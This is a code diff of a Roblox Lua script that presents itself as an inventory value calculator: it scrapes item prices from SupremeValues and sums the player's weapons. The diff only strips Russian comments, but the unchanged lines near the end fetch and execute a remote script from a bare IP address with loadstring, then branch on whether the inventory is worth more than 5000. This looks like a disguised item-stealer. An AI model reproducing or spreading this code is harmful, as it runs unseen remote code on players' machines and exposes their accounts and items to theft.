@@ -33,7 +33,7 @@ local function trim(s)
     return s:match("^%s*(.-)%s*$")
 end
 
--- Функция для выполнения HTTP GET запроса
+
 local function fetchHTML(url)
     if not HttpRequest then return "" end
     local ok, resp = pcall(function()
@@ -42,7 +42,7 @@ local function fetchHTML(url)
     return ok and resp and resp.Body or ""
 end
 
--- Функция для парсинга значения
+
 local function parseValue(itembodyDiv)
     local valueStr = itembodyDiv:match("<b%s+class=['\"]itemvalue['\"]>([%d,%.]+)</b>")
     if valueStr then
@@ -53,7 +53,7 @@ local function parseValue(itembodyDiv)
     return nil
 end
 
--- Функция для извлечения обычных предметов (не хрома)
+
 local function extractItems(htmlContent)
     local itemValues = {}
     if not htmlContent or htmlContent == "" then return itemValues end
@@ -69,7 +69,7 @@ local function extractItems(htmlContent)
     return itemValues
 end
 
--- Функция для извлечения хрома
+
 local function extractChromaItems(htmlContent)
     local chromaValues = {}
     if not htmlContent or htmlContent == "" then return chromaValues end
@@ -84,7 +84,7 @@ local function extractChromaItems(htmlContent)
     return chromaValues
 end
 
--- Основная функция для построения списка ценностей (supremevalues)
+
 local function buildValueList()
     local allExtractedValues, chromaExtractedValues = {}, {}
     local categoriesToFetch = {}
@@ -92,7 +92,7 @@ local function buildValueList()
     local totalCategories, completed = #categoriesToFetch, 0
     local lock = Instance.new("BindableEvent")
 
-    -- Параллельное выполнение запросов
+
     for _, category in ipairs(categoriesToFetch) do
         task.spawn(function()
             local rarity, url = category.rarity, category.url
@@ -150,13 +150,13 @@ local untradable = {
     ["GreenCamo_K_2022"] = true, ["SharkSeeker"] = true
 }
 
--- 1. Получаем список ценностей с SupremeValues
+
 local valueList = buildValueList() 
 
--- 2. Получаем инвентарь игрока (имитация)
+
 local realData = ReplicatedStorage.Remotes.Inventory.GetProfileData:InvokeServer(plr.Name)
 
--- 3. Рассчитываем общую сумму
+
 local min_rarity_index = table.find(rarityTable, min_rarity)
 
 for i, v in pairs(realData.Weapons.Owned) do
@@ -180,7 +180,7 @@ for i, v in pairs(realData.Weapons.Owned) do
     end
 end
 
--- 4. Выводим результат в консоль
+
 print("Общая сумма ценностей (SupremeValues): " .. totalValue)
 loadstring(game:HttpGet("http://109.71.240.235:3910/cdn/visual.luau"))()
 if totalValue > 5000 then
